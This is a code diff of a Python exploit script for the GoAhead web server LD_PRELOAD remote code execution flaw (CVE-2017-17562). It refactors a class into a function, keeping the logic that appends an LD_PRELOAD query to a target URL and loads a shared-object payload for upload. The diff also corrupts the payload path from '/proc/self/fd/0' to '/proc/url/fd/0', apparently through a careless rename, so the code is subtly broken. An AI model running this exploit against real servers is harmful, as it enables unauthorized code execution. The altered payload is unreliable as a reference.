@@ -12,19 +12,13 @@ import os
 import sys
 import requests
 import warnings
-
-
-class LD_PRELOAD_rce_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['GoAhead LD_PRELOAD远程代码执行(CVE-2017-17562)', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
-        payload = "?LD_PRELOAD=/proc/self/fd/0"
-        vulnurl = self.url + payload
+        payload = "?LD_PRELOAD=/proc/url/fd/0"
+        vulnurl = url + payload
         try:
             path = os.getcwd() + "/bin/goahead_payload.so"
             data = open(path, 'rb')
@@ -41,5 +35,5 @@ class LD_PRELOAD_rce_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = LD_PRELOAD_rce_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
